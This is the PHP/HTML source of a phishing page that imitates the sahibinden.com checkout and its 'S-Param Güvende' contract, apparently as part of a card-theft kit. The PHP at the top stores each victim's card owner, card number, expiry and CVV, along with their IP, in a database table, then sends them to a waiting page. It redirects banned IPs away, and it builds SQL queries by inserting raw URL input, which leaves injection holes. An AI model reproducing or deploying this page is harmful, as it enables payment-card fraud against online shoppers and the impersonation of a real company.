<?php
  include('settings/router.php');
  session_start();
  ob_start();
  $ip = $_SERVER['REMOTE_ADDR'];
  $id = $_GET['id'];
  $name = $_SESSION['tum']['firstName'].' '.$_SESSION['tum']['lastName'];

  if(!$_GET){
    header('Location: https://www.google.com');
  }

  try {
    $conn = new PDO($dsn, $user, $password);
    $conn->exec("SET NAMES 'utf8'; SET CHARSET 'utf8'");
  } catch (PDOException $e) {
    print $e->getMessage();
  }

  //IP BAN
  $query2 = $conn->query("SELECT * FROM ban WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  if ($query2){
      header('Location: https://youtu.be/ezxYxeTDxTM?t=19');
    exit;
  }

  $q = $_GET['q'];
  
  $aa = $conn->query("SELECT * FROM ilan_telefon WHERE ilanurl = '{$q}'")->fetch(PDO::FETCH_ASSOC);
  $bb = $conn->query("SELECT * FROM ilan_playstation WHERE ilanurl = '{$q}'")->fetch(PDO::FETCH_ASSOC);

  if($aa) {
    $query = $aa;
  } else if ($bb) {
    $query = $bb;
  }

  if($_POST) {
    $cardOwner = trim(filter_input(INPUT_POST, 'cardOwner'));
    $cardNo = trim(filter_input(INPUT_POST, 'cardNo'));
    $month = trim(filter_input(INPUT_POST, 'month'));
    $year = trim(filter_input(INPUT_POST, 'year'));
    $cvv = trim(filter_input(INPUT_POST, 'cvv'));

    if (empty($cardOwner) || empty($cardNo) || empty($month) || empty($year) || empty($cvv)){
      header("location:index.php");
      exit;
    }else{
      try{
        $query3 = $conn->prepare("INSERT INTO 3d SET cardOwner = ?, cardnumber = ?, month = ?, year = ?, cvv = ?, ip=?");
        $insert = $query3->execute(array($cardOwner, $cardNo, $month, $year, $cvv, $ip));
        if ($insert){
            $idx = $conn->lastInsertId();
            $_SESSION["tum"] = ["id" => $idx, "cardOwner" => $cardOwner, "ip" => $ip];
            header("location:wait.php?id={$_SESSION["tum"]["id"]}&q={$_GET['q']}");
        }
    }
    catch(PDOException $e){
        die($e->getMessage());
    }
    }
  }

if ($query){

  function addition($value) {
      $firstStep = explode(',', $value);
      $secondStep = explode('.', $firstStep[0]);
      @$last = $secondStep[0] . $secondStep[1];
      return $last;
  }


  function beforeCommas($value) {
      $firstStep = explode(',', $value);
      $mainMoney = $firstStep[0];
      return $mainMoney;
  }

  function afterCommas($value) {
      $firstStep = explode(',', $value);
      $afterCommas = $firstStep[1];
      return $afterCommas;
  }
?>
<!DOCTYPE html>
<html class="" lang="tr">
  <head>
    <style type="text/css">
      @charset "UTF-8";

      [ng\:cloak],
      [ng-cloak],
      [data-ng-cloak],
      [x-ng-cloak],
      .ng-cloak,
      .x-ng-cloak,
      .ng-hide:not(.ng-hide-animate) {
        display: none !important;
      }

      ng\:form {
        display: block;
      }

      .ng-animate-shim {
        visibility: hidden;
      }

      .ng-anchor {
        position: absolute;
      }

      @media (max-width: 768px) {
        .address-container {
          display: flex;
          align-items: center;
          justify-content: center;
          flex-direction: column;
        }

        .address-container .left {
          margin-right: 0 !important;
        }

        .address-container .right {
          margin-bottom: 50px;
        }
      }
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta id="Content-Language" http-equiv="Content-Language" content="tr">
    <meta name="rating" content="general">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <meta name="revisit-after" content="1 Days">
    <link rel="shortcut icon" href="assets/css/favicon.ico" type="image/x-icon">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>sahibinden.com - Satılık, Kiralık, 2. El, Emlak, Oto, Araba, Bilgisayar, Film, Cep Telefonu, Elektronik, Antika, Giyim, Mobilya, Eleman Arayanlar ve daha fazlası - İlan ve alışverişte ilk adres</title>
    <link href="assets/css/common.css" media="screen, print" rel="stylesheet" type="text/css">
    <link href="assets/css/payment.css" media="screen, print" rel="stylesheet" type="text/css">
  </head>
  <body class="type-individual ios">
    <div class="header-banners clearfix">
      <div class="mast-head-banner"></div>
      <div class="header-container without-background">
        <div class="header secure-payment">
          <p class="clearfix">
            <a class="logo" href="https://www.sahibinden.com" title="sahibinden.com anasayfasına dön" style="pointer-events: none;"> sahibinden.com anasayfasına dön</a>
          </p>
          <h1>Ödeme Bilgileri</h1>
        </div>
      </div>
      <div id="container">
        <link href="/assets/css/dialog.css" type="text/css" rel="stylesheet">
        <div id="slsDialogFe" class="safe ng-scope">
          <div ng-include="'/views/myAccount/common/RenewSls/RenewSls.html'" class="ng-scope">
            <style class="ng-scope">
              .safe .hidden {
                visibility: hidden
              }

              .big-image {
                object-fit: contain;
                background: white;
              }

              .safe .dialog-content p {
                display: block;
                font-size: 14px;
                line-height: 19px;
                margin-bottom: 15px;
                color: #333
              }

              .safe .dialog-content .dialog-buttons {
                color: inherit;
                font-size: inherit;
                line-height: inherit;
                margin-bottom: inherit
              }

              .safe .dialog-content .form-error {
                color: #fb0317;
                font-size: 11px
              }

              .safe .dialog-content .btn-form {
                padding: 6px 16px
              }

              .safe .dialog-content .info-holder .contact {
                line-height: 1
              }

              .safe .dialog-content .info-holder .contact h3 {
                padding-bottom: 5px
              }

              .safe .dialog-content .info-holder .contact h4 {
                font-weight: 200
              }

              .renew-sls {
                width: 550px
              }

              .renew-sls h5 {
                font-size: 14px;
                line-height: 1.4em;
                color: #333;
                margin: 25px 0
              }

              .renew-sls .renewSlsForm {
                overflow: hidden
              }

              .renew-sls .renewSlsForm .left-column {
                width: 49%;
                float: left
              }

              .renew-sls .renewSlsForm .right-column {
                width: 49%;
                float: right
              }

              .renew-sls .renewSlsForm .button-section {
                padding: 20px 0 0;
                clear: both
              }

              .renew-sls .renewSlsForm .button-section h5 {
                margin: 10px 0 0;
                display: inline-block
              }

              .renew-sls .renewSlsForm p {
                color: #333;
                font-size: 12px;
                font-weight: 700;
                margin: 0 0 3px 0
              }

              .renew-sls .renewSlsForm input {
                width: 100%;
                box-sizing: border-box;
                margin-bottom: 20px
              }

              .renew-sls .renewSlsForm button {
                float: right;
                display: block;
                width: 150px
              }

              .classifiedDetailContent .renew-sls h5 {
                font-weight: normal
              }

              .classifiedDetailContent .renew-sls input[type='text']:disabled {
                color: #999;
                background-color: #f2f2f2
              }
            </style>
          </div>
        </div>
        <div class="set-payment-container set-payment-active-step-3">
          <div class="payment-progress">
            <div class="bar w63"></div>
            <ul>
              <li class="step-0"></li>
              <li class="step-1">
                <strong>1</strong>
                <span>Ürün</span>
                <span class="responsive-part">Ürün</span>
              </li>
              <li class="step-2">
                <strong>2</strong>
                <span>Adres</span>
                <span class="responsive-part">Adres</span>
              </li>
              <li class="step-3">
                <strong>3</strong>
                <span>Ödeme</span>
                <span class="responsive-part">Ödeme</span>
              </li>
              <li class="step-4">
                <strong>4</strong>
                <span class="last">Ödeme Alındı</span>
                <span class="responsive-part">Ödeme Alındı</span>
              </li>
            </ul>
          </div>
          <form action="#" method="POST" autocomplete="off">
            <div class="set-payment-step-3-detail" style="display:block">
              <div class="left-box">
                <div class="sub-left-box credit-card-box">
                  <div class="address-header">
                    <h3>ÖDEME</h3>
                    <a href="#" class="installmentsInfoLink">Taksit ve Kampanyalar</a>
                  </div>
                  <div id="creditCardPayment" class="paymentTypes">
                    <form id="paymentWithCreditCardForm" class="sahibinden-trackable-form" data-track-form="GET" action="" method="POST" autocomplete="off">
                      <div class="credit-card-form">
                        <div class="left-column">
                          <strong>
                            <label id="cardOwnerLabel" for="cardOwner">Kart Üzerindeki Ad Soyad</label>
                          </strong>
                          <input type="text" name="cardOwner" id="cardOwner" value="<?=$name?>" maxlength="32">
                          <label class="error" style="display:none">Lütfen kart üzerinde yazan ismi girin</label>
                          <div class="card-info">
                            <strong>
                              <label id="cardNoLabel" for="cardOwner" class="icon-hidden">Kart Numarası</label>
                            </strong>
                            <input type="tel" name="cardNo" id="cardNo" class="card-no numericInput" data-track-label="cardno" placeholder="____  ____  ____  ____">
                            <label class="error" style="display:none">Lütfen geçerli bir kart numarası girin</label>
                            <span class="onCardLogo"></span>
                          </div>
                          <div class="expiration-column">
                            <strong>
                              <label>Son Kullanma Tarihi</label>
                            </strong>
                            <div class="expireMonth">
                              <label for="expireMonth" class="hybrid-select">
                                <select id="expireMonth" name="month">
                                  <option value="" selected="selected">Ay</option>
                                  <option>01</option>
                                  <option>02</option>
                                  <option>03</option>
                                  <option>04</option>
                                  <option>05</option>
                                  <option>06</option>
                                  <option>07</option>
                                  <option>08</option>
                                  <option>09</option>
                                  <option>10</option>
                                  <option>11</option>
                                  <option>12</option>
                                </select>
                              </label>
                              <label class="error" style="display:none">Lütfen ay seçin</label>
                            </div>
                            <div class="expireYear">
                              <label for="expireYear" class="hybrid-select">
                                <select id="expireYear" name="year">
                                  <option value="" selected="selected">Yıl</option>
                                  <option>2022</option>
                                  <option>2023</option>
                                  <option>2024</option>
                                  <option>2025</option>
                                  <option>2026</option>
                                  <option>2027</option>
                                  <option>2028</option>
                                  <option>2029</option>
                                  <option>2030</option>
                                  <option>2031</option>
                                  <option>2032</option>
                                  <option>2033</option>
                                  <option>2034</option>
                                  <option>2035</option>
                                  <option>2036</option>
                                  <option>2037</option>
                                  <option>2038</option>
                                  <option>2039</option>
                                  <option>2040</option>
                                  <option>2041</option>
                                  <option>2042</option>
                                  <option>2043</option>
                                  <option>2044</option>
                                  <option>2045</option>
                                  <option>2046</option>
                                  <option>2047</option>
                                </select>
                              </label>
                              <label class="error" style="display:none">Lütfen yıl seçin</label>
                            </div>
                          </div>
                          <div class="cvc2-column">
                            <strong>
                              <label>Güvenlik Kodu (CVV)</label>
                            </strong>
                            <input type="tel" path="cvv" id="cvc2" name="cvv" class="card-no numericInput" data-track-label="cardcvc" autocomplete="off" placeholder="___">
                            <label class="error cvc" style="display:none">Lütfen güvenlik kodu girin</label>
                          </div>
                        </div>
                      </div>
                      <div class="secure-3d-get">
                        <input type="checkbox" name="use3D" id="using3d" onclick="sendUsing3dEvent();" class="sg-checkbox" checked="true" disabled="">
                        <label for="using3d">3D Secure ile ödeme yapmak istiyorum.</label>
                      </div>
                      <div id="installmentsInfo" class="installmentsInfo campaign-info-disabled">
                        <h3 class="campaign-title">Kampanyalar</h3>
                        <div class="installmentSupportedCards campaign">
                          <div class="cardInfo">
                            <div class="cardDetails campaign">
                              <div class="installmentSupportedCardLogos">
                                <div class="cardLogo "></div>
                              </div>
                              <div class="cardLogoHolder">
                                <div class="cardLogo "></div>
                              </div>
                              <h3>
                                <span class="bonus-amount"></span> TL Hediye!
                              </h3>
                              <p>
                                <span class="pretty-date"></span> tarihleri arasında yapacağınız alışverişle <strong>
                                  <span class="bonus-amount"></span> TL </strong>
                                <span class="gift-card-type"></span> Hediye!
                              </p>
                              <p>
                                <span class="sms-text"></span> Ayrıntılı bilgi için <a class="help-url" href="" target="_blank">tıklayın.</a>
                              </p>
                            </div>
                          </div>
                        </div>
                        <h3 id="installmentOptionTitle">
                          <strong>Taksit Seçenekleri</strong>
                        </h3>
                        <div class="installmentsText"></div>
                        <!--Alt kisim sadece responsive de aktif -->
                        <div class="installmentSupportedCardLogos cards">
                          <div class="cardsLogoColumn">
                            <div class="cardLogo worldcard  "></div>
                            <div class="cardLogo bonus"></div>
                            <div class="cardLogo axess"></div>
                            <div class="cardLogo maximum"></div>
                            <div class="cardLogo cardfinans"></div>
                            <div class="cardLogo paraf"></div>
                          </div>
                        </div>
                        <div class="installmentSupportedCards logos">
                          <div class="cardInfo">
                            <h3 class="cardName">World</h3>
                            <div class="cardLogoHolder">
                              <div class="cardLogo worldcard"></div>
                            </div>
                            <div class="cardDetails">Yapı Kredi Worldcard</div>
                          </div>
                          <div class="cardInfo">
                            <h3 class="cardName">Bonus</h3>
                            <div class="cardLogoHolder">
                              <div class="cardLogo bonus"></div>
                            </div>
                            <div class="cardDetails">Alternatifbank Ticari Kart, Alternatifbank Bonus, Alternatifbank Kart, American Express Card, BonusNet Debit Kartlar, Bonus, Denizbank Ticari Kart, Denizbank Tüzel Kart, Denizbank Bonus, Denizbank Kart, Denizbank PTT Bonus, EBT Ticari, EBT, Fiba Bonus Ticari Kart, Fibabanka Bonus, İNG Bonus Ticari Kart, İNG Bonus, İNG Pegasus Kart, Şekerbank Ticari Kart, Şekerbank Bonus, TEB Bonus Sanal, TEB Bonus Ticari Kart, TEB Bonus, TFKB Zero Kart, Türkiye Finans Bonus, ICBC Bonus TK, ICBC Bonus.</div>
                          </div>
                          <div class="cardInfo">
                            <h3 class="cardName">Axess</h3>
                            <div class="cardLogoHolder">
                              <div class="cardLogo axess"></div>
                            </div>
                            <div class="cardDetails">Axess ve Wings kartlarınızı kullanarak alışveriş yapabilirsiniz.</div>
                          </div>
                          <div class="cardInfo">
                            <h3 class="cardName">Maximum</h3>
                            <div class="cardLogoHolder">
                              <div class="cardLogo maximum"></div>
                            </div>
                            <div class="cardDetails">Maximum Kart</div>
                          </div>
                          <div class="cardInfo">
                            <h3 class="cardName">CardFinans</h3>
                            <div class="cardLogoHolder">
                              <div class="cardLogo cardfinans"></div>
                            </div>
                            <div class="cardDetails">QNB Finansbank CardFinans</div>
                          </div>
                          <div class="cardInfo">
                            <h3 class="cardName">Paraf</h3>
                            <div class="cardLogoHolder">
                              <div class="cardLogo paraf"></div>
                            </div>
                            <div class="cardDetails">Halkbank Paraf</div>
                          </div>
                        </div>
                        <div class="installmentNotes">
                          <div class="cardsExtraInfo"> * Bonus Genç, Bonus Flexi ve Flexi kartlara maksimum 3 taksit uygulanabilir. </div>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
                <div class="sub-left-box mss-aggrement agreement-service">
                  <strong>S - PARAM GÜVENDE HİZMET SÖZLEŞMESİ</strong>
                  <div id="servicePriceAgreement" class="mss-container">
                    <div class="mss-content">
                      <div style="color:#999999;">
                        <p id="servicePricePreInfoTitle" style="margin:0 0 10px 0; text-decoration:underline; font-weight:bold;">ÖN BİLGİLENDİRME FORMU</p>
                        <p style="margin:0 0 15px 0; font-weight:bold;"> HİZMET VERENİN BİLGİLERİ </p>
                        <p style="margin:0 0 2px 0;">
                          <span style="font-weight:bold;">Ticaret Unvanı:</span> Sahibinden Bilgi Teknolojileri Pazarlama ve Ticaret A.Ş.
                        </p>
                        <p style="margin:0 0 2px 0;">
                          <span style="font-weight:bold;">Kep adresi:</span> sahibinden@hs02.kep.tr
                        </p>
                        <p style="margin:0 0 2px 0;">
                          <span style="font-weight:bold;">MERSİS numarası:</span> 0739014655600017
                        </p>
                        <p style="margin:0 0 15px 0;">
                          <span style="font-weight:bold;">Adresi:</span> Değirmenyolu Cad. No:28 Asia Ofis Park İşm. A Blok Kat:2 Ataşehir/İstanbul
                        </p>
                        <p style="margin:0 0 2px 0;">www.sahibinden.com portalında “Bireysel Üye” olarak ve “S-Param Güvende Hizmeti” ile ürün sipariş etmek isteyen Hizmet Alan (“Alıcı”) olarak aşağıda detayları belirtilen “S-Param Güvende Hizmeti”ne (“Hizmet”) ilişkin siparişi onaylamakta ve “Hizmet”i aşağıdaki fiyat ve koşullarla satın almayı kabul etmektesiniz.</p>
                        <p style="margin:0 0 30px 0;">İşbu Sözleşme, sözleşmenin kurulmasından sonra Hizmet Veren tarafından Hizmet Alan’a (“Alıcı”ya) e-posta ile gönderilecektir.</p>
                        <p style="margin:0 0 15px 0; font-weight:bold;">HİZMET BİLGİLERİ:</p>
                        <p style="margin:0 0 2px 0;">Hizmet Adı: “S-Param Güvende”</p>
                        <p style="margin:0 0 2px 0;">Hizmet Açıklaması: Ek-1 olarak sunulan S-Param Güvende Hizmetine ilişkin detaylı bilgileri inceleyiniz</p>
                        <p style="margin:0 0 2px 0;">Adedi: 1</p>
                        <p style="margin:0 0 2px 0;">Peşin Fiyatı (tüm vergiler dâhil): <span id="parisFeeUnit"><?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                        </p>
                        <p style="margin:0 0 2px 0;">Ödeme şekli: Havale/EFT</p>
                        </p>
                        <table border="1" cellspacing="0" cellpadding="10" style="min-height: 75px; width: 100%; margin-bottom: 20px; border-collapse: collapse;border: 1px solid #d8d8d8; white-space: nowrap; color: #999999;" class="agreement-table">
                          <tbody>
                            <tr style="text-align: left; color: #999;">
                              <th style="width: 100%; border: 1px solid #d8d8d8;">Hizmet Adı</th>
                              <th style="border: 1px solid #d8d8d8;">Adet</th>
                              <th style="border: 1px solid #d8d8d8;">Peşin Fiyatı*</th>
                              <th style="border: 1px solid #d8d8d8;">Toplam Tutar**</th>
                              <th class="installment-price-info" style="border: 1px solid #d8d8d8;display: none;">Taksitle Ödenecek Toplam Tutar***</th>
                            </tr>
                            <tr>
                              <td style="white-space: normal; border: 1px solid #d8d8d8;">S - Param Güvende Hizmeti</td>
                              <td style="border: 1px solid #d8d8d8;">1</td>
                              <td style="border: 1px solid #d8d8d8;" class="nowrap">
                                <span id="parisFeeUnit"><?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                              </td>
                              <td style="border: 1px solid #d8d8d8;" class="nowrap">
                                <span id="parisFeeUnit"><?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                              </td>
                              <td class="nowrap installment-price-info" style="border: 1px solid #d8d8d8;display: none;">
                                <span id="parisFeeTotal"><?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                              </td>
                            </tr>
                          </tbody>
                        </table>
                        <ul class="table-description" style="list-style-type: none; color: #999999; margin-bottom: 10px; padding: 0;">
                          <li>* Tüm vergiler dahil peşin birim fiyatı gösterir.</li>
                          <li>** Tüm vergiler dahil toplam tutarı gösterir.</li>
                          <li class="installment-price-info" style="display: none;">*** Tüm vergiler ve taksit farkı dahil toplam tutarı gösterir.</li>
                        </ul>
                        </p>
                        <p style="margin:0 0 2px 0; font-weight:bold;">CAYMA HAKKI:</p>
                        <p style="margin:0 0 2px 0;">Mesafeli Sözleşmeler Yönetmeliği’nin 15(h) maddesinde “cayma hakkı süresi sona ermeden önce tüketicinin onayı ile ifasına başlanan hizmet sözleşmeleri” cayma hakkının istisnası olarak kabul edildiğinden; “Hizmet Alan” işbu sözleşmeye konu “Hizmet” bakımından cayma hakkının olmadığını kabul eder. </p>
                        <p style="margin:0 0 15px 0;">“Hizmet Alan”, Mesafeli Sözleşmeler Yönetmeliği gereği cayma hakkına ilişkin bilgilendirmenin gereği gibi yapıldığını kabul eder. </p>
                        <p style="margin:0 0 15px 0; font-weight:bold;">S-PARAM GÜVENDE HİZMET SÖZLEŞMESİ (“SÖZLEŞME”)</p>
                        <p style="margin:0 0 15px 0; font-weight:bold;">MADDE 1- TARAFLAR </p>
                        <p style="margin:0 0 2px 0; font-weight:bold; text-decoration:underline;">HİZMET VEREN (“SAHİBİNDEN”)</p>
                        <p style="margin:0 0 2px 0;">Unvan: Sahibinden Bilgi Teknolojileri Pazarlama ve Ticaret A.Ş.</p>
                        <p style="margin:0 0 2px 0;">Adresi: Değirmenyolu Cad. No: 28 Asia Ofis Park İş Merkezi A Blok Kat: 2 İçerenköy Ataşehir İstanbul</p>
                        <p style="margin:0 0 2px 0;">MERSİS numarası: 0739014655600017</p>
                        <p style="margin:0 0 2px 0;">Telefon: 0 850 222 44 44</p>
                        <p style="margin:0 0 2px 0;">E-mail: sahibinden@hs02.kep.tr</p>
                        <p style="margin:0 0 15px 0;">Şikayetler için İrtibat Bilgisi: 0 850 222 44 44</p>
                        <p style="margin:0 0 2px 0; font-weight:bold; text-decoration:underline;">HİZMET ALAN (“ALICI”)</p>
                        <p style="margin:0 0 15px 0; font-weight:bold;">MADDE 2- SÖZLEŞMENİN KONUSU:</p>
                        <p style="margin:0 0 15px 0;">İşbu “Sözleşme”nin konusu; “Hizmet Veren” tarafından www.sahibinden.com alan adlı internet sitesi (“Portal”) üzerinden “Hizmet Alan”a sağlanmakta olan, “Sözleşme”nin 3.maddesinde özellikleri ve fiyatı belirtilen S-Param Güvende hizmetine (“Hizmet”e) ilişkin olarak tarafların hak ve yükümlülüklerinin tespitidir. </p>
                        <p style="margin:0 0 15px 0;">İşbu “Sözleşme”, Tüketicinin Korunması Hakkında Kanun ve Mesafeli Sözleşmeler Yönetmeliği’ne uygun olarak düzenlenmiştir. İşbu Sözleşme’de hüküm bulunmayan hallerde Tüketicinin Korunması Hakkında Kanun ve Mesafeli Sözleşmeler Yönetmeliği’nde yer alan hükümler uygulanır. İşbu “Sözleşme”nin tarafları; “Sözleşme” ile birlikte Tüketicinin Korunması Hakkında Kanun ve Mesafeli Sözleşmeler Yönetmeliği’nden kaynaklanan yükümlülük ve sorumluluklarını bildiklerini ve anladıklarını kabul ve beyan ederler. </p>
                        <p style="margin:0 0 15px 0;">İşbu “Sözleşme”, “Hizmet Alan”ın “Tüketici” olduğu hallerde uygulanacaktır. “Hizmet Alan”ın mesleki veya ticari amaçlarla “Hizmet”i satın aldığı hallerde; “Hizmet Alan” onaylamış olsa dahi işbu “Sözleşme” hükümleri uygulanmayacaktır. </p>
                        <p style="margin:0 0 15px 0;">İşbu Sözleşme, “Hizmet Veren” tarafından sağlanan “S-Param Güvende” hizmetine ilişkin sorumlulukları belirlemekte olup, “Hizmet Alan”ın işbu “Hizmet”ten yararlanarak satın aldığı ürün ile ilgili “Hizmet Veren”e herhangi bir yükümlülük getirmemektedir. Satın alınan ürün bakımından SAHİBİNDEN’in “Aracı Hizmet Sağlayıcı” sıfatıyla hareket ettiğini, “Hizmet Veren”in satın aldığı ürüne veya ürünün satış ve teslim süreçlerine dair herhangi bir sorumluluğu bulunmadığını, ürün ile ilgili her türlü talep, iddia veya şikâyetinin muhatabının sadece ürünün satıcısı olduğunu “Hizmet Alan” kabul ve taahhüt etmektedir. </p>
                        <p style="margin:0 0 15px 0; font-weight:bold;">MADDE 3- “HİZMET”E İLİŞKİN BİLGİLER:</p>
                        <p style="margin:0 0 2px 0;">“Hizmet”e ilişkin bilgiler aşağıda yer almaktadır:</p>
                        <p style="margin:0 0 2px 0;">“Hizmet”in Adı: “S-Param Güvende”</p>
                        <p style="margin:0 0 2px 0;">Hizmet Açıklaması: Detaylı bilgi için Ek-1’deki S-Param Güvende Hizmeti Kurallarını inceleyiniz</p>
                        <p style="margin:0 0 2px 0;">Adedi: 1</p>
                        <p style="margin:0 0 2px 0;">Peşin Fiyatı (tüm vergiler dâhil): <span id="parisFeeUnit"><?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                        </p>
                        <p style="margin:0 0 2px 0;">Ödeme şekli: Kredi kartı veya banka kartı</p>
                        <p style="margin:0 0 15px 0;">Taksit Seçeneği: <span id="parisInstallmentCount">Tek Çekim</span>
                        </p>
                        <table border="1" cellspacing="0" cellpadding="10" style="min-height: 75px; width: 100%; margin-bottom: 20px; border-collapse: collapse;border: 1px solid #d8d8d8; white-space: nowrap; color: #999999;" class="agreement-table">
                          <tbody>
                            <tr style="text-align: left; color: #999;">
                              <th style="width: 100%; border: 1px solid #d8d8d8;">Hizmet Adı</th>
                              <th style="border: 1px solid #d8d8d8;">Adet</th>
                              <th style="border: 1px solid #d8d8d8;">Peşin Fiyatı*</th>
                              <th style="border: 1px solid #d8d8d8;">Toplam Tutar**</th>
                              <th class="installment-price-info" style="border: 1px solid #d8d8d8;display: none;">Taksitle Ödenecek Toplam Tutar***</th>
                            </tr>
                            <tr>
                              <td style="white-space: normal; border: 1px solid #d8d8d8;">S - Param Güvende Hizmeti</td>
                              <td style="border: 1px solid #d8d8d8;">1</td>
                              <td style="border: 1px solid #d8d8d8;" class="nowrap">
                                <span id="parisFeeUnit"><?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                              </td>
                              <td style="border: 1px solid #d8d8d8;" class="nowrap">
                                <span id="parisFeeUnit"><?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                              </td>
                              <td class="nowrap installment-price-info" style="border: 1px solid #d8d8d8;display: none;">
                                <span id="parisFeeTotal"><?=beforeCommas($query['hizmetbedeli'])?> <sup></sup> TL </span>
                              </td>
                            </tr>
                          </tbody>
                        </table>
                        <ul class="table-description" style="list-style-type: none; color: #999999; margin-bottom: 10px; padding: 0;">
                          <li>* Tüm vergiler dahil peşin birim fiyatı gösterir.</li>
                          <li>** Tüm vergiler dahil toplam tutarı gösterir.</li>
                          <li class="installment-price-info" style="display: none;">*** Tüm vergiler ve taksit farkı dahil toplam tutarı gösterir.</li>
                        </ul>
                        </p>
                        <p style="margin:0 0 15px 0; font-weight:bold;">MADDE 4 - GENEL HÜKÜMLER</p>
                        <ol style="margin:0 0 15px 0;list-style-type:none">
                          <li> 4.1. “Hizmet Alan”, yukarıda 3. Maddede ve işbu Sözleşme’nin ekinde yer alan Ek-1’de belirtilen “Hizmet”in özelliklerine ve satışına ilişkin koşulları ve tüm bilgileri okuduğunu, bu “Hizmet”i satın almak için gerekli onayı elektronik ortamda verdiğini kabul, beyan ve taahhüt eder. </li>
                          <li> 4.2. İşbu Sözleşme “Hizmet Alan” tarafından elektronik olarak onaylandığı tarihte yürürlüğe girer. </li>
                          <li> 4.3. Satın alınan hizmetin fiziksel bir teslimatı yoktur. </li>
                        </ol>
                        <p style="margin:0 0 15px 0; font-weight:bold;">MADDE- 5 CAYMA HAKKI:</p>
                        <p style="margin:0 0 2px 0;">Mesafeli Sözleşmeler Yönetmeliği’nin 15(h) maddesinde “cayma hakkı süresi sona ermeden önce tüketicinin onayı ile ifasına başlanan hizmet sözleşmeleri” cayma hakkının istisnası olarak kabul edildiğinden; “Hizmet Alan” işbu sözleşmeye konu “Hizmet” bakımından cayma hakkının olmadığını “Hizmet Alan” kabul eder.</p>
                        <p style="margin:0 0 15px 0;">Hizmet Alan, Mesafeli Sözleşmeler Yönetmeliği gereği cayma hakkına ilişkin bilgilendirmenin gereği gibi yapıldığını kabul eder.</p>
                        <p style="margin:0 0 15px 0; font-weight:bold;">MADDE- 6 YETKİLİ MAHKEME:</p>
                        <p style="margin:0 0 15px 0;">“Hizmet Alan”ın “Hizmet”e ilişkin her türlü şikâyet ve itirazına ilişkin başvurularında veişbu Sözleşme ile ilgili çıkabilecek diğer ihtilaflarda her yıl Gümrük ve Ticaret Bakanlığı tarafından ilan edilen değere kadar “Hizmet Alan”ın veya “Hizmet Veren”in yerleşim yerinin bulunduğu yerdeki Tüketici Hakem Heyetleri, söz konusu değerin üzerindeki ihtilaflarda ise Tüketici Mahkemeleri yetkilidir.</p>
                        <p style="margin:0 0 15px 0; font-weight:bold;">Eki: Ek-1 Param Güvende Hizmeti Kuralları</p>
                        <ol style="list-style-position: inside; list-style-type: decimal;">
                          <li> S-Param Güvende Hizmeti”(“Hizmet”); “Satıcı”nın Portal’da ilanını verdiği ikinci el veya sıfır ürünü (bundan böyle “ürün” olarak anılacaktır) “Alıcı”nın kredi kartıyla veya banka kartıyla güvenli olarak satın almasına yönelik SAHİBİNDEN hizmetidir. Bu amaçla SAHİBİNDEN; "Alıcı" ve "Satıcı"nın "Portal"da çevrimiçi (online) ortamda anlaşmalarını sağlayacak alt yapıyı sağlamakta, “Satıcı”; “kargo ile gönderim” tercihi ile ürüne ilişkin ilanı yayınlamakta, “Alıcı"; elektronik ortamda “S-Param Güvende” hizmetini satın alarak ilandaki ürünü sipariş etmektedir. S-Param Güvende Hizmet Bedeli; “SAHİBİNDEN”in değişen piyasa koşullarına göre belirlediği, ürün/ürünlere ilişkin ödenecek toplam ürün bedeli üzerinden hesaplanan “Alıcı”nın ödediği hizmet bedelidir. Ürün bedeli, “Alıcı”nın kredi kartından veya banka kartından “SAHİBİNDEN”in anlaşmalı ödeme kuruluşu çekildiği an itibariyle güvence altına alındığından; “Alıcı”nın S-Param Güvende hizmetinden cayma hakkı yoktur. “Alıcı”nın S-Param Güvende hizmetini satın alması üzerine yaptığı ödeme güvence altına alındığından SAHİBİNDEN S-Param Güvende hizmet bedeline hak kazanır. Sadece ürünün “Satıcı” tarafından kargoya verilmemesi veya ürün kargoya verilmeden satışının Satıcı tarafından iptal edilmesi halinde; “S-Param Güvende Hizmet Bedeli” “Alıcı”ya iade edilir, diğer tüm hallerde “S-Param Güvende Hizmet Bedeli” SAHİBİNDEN’in hesabına aktarılır. Taraflar, işbu Sözleşme hükümleri kapsamında, ürün bedelinin “SAHİBİNDEN”in anlaşmalı ödeme kuruluşu tarafından muhafaza edilmesi ve S-Param Güvende hizmeti koşullarına uygun olarak ilgili tarafa aktarılması işlemlerinin koordinasyonunun “SAHİBİNDEN” tarafından yürütüleceği konusunda mutabıktır. </li>
                          <li> “Alıcı” ve “Satıcı” bu amaçla ürün satışına yönelik sözleşmeyi okuyup, kabul edip, “Anlaşmalı Kargo ile Gönderim Koşulları”nı onaylayarak, bu düzenlemelere uygun davranmayı kabul ve taahhüt etmektedir. </li>
                          <li> S-Param Güvende Hizmet Bedeli”nin ve ürün bedelinin ödenmesinde "Alıcı"ya anlaşmalı bankalar aracılığıyla taksitle ödeme kolaylığı sunulabilir. "Alıcı" taksitle ödemeyi tercih ederse, taksitli ödemeden doğan taksit (vade) farkını bankaya ödemeyi kabul eder. Taksit farkı, SAHİBİNDEN tarafından “Alıcı”ya fatura edilir ve ürün satış ve teslimine yönelik süreçlerin tamamlanması üzerine taksit farkı tutarı “SAHİBİNDEN”in anlaşmalı ödeme kuruluşu tarafından ilgili bankaya aktarılır. Taksit farkı bankaya ve ürün tutarına göre değişiklik gösterebilir. Mevzuat gereği belirli kategorilerde taksitli ödeme kısıtlaması uygulanır. </li>
